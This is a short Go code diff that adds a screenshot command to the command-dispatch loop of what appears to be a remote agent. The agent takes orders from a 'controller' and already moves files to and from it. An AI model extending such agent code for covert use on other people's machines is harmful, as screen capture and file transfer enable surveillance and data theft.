@@ -33,6 +33,8 @@ func main() {
 			resp = modules.DownloadFileFromController(cmdReq.GetUploadFileRequest())
 		case pb.DOWNLOAD_FILE_CMD_TYPE:
 			resp = modules.UploadFileToController(cmdReq.GetDownloadFileRequest())
+		case pb.SCREENSHOT_CMD_TYPE:
+			resp = modules.Screenshot(cmdReq.GetScreenshotRequest())
 		}
 		err = controller.WriteCommandResponse(resp)
 		if err != nil {
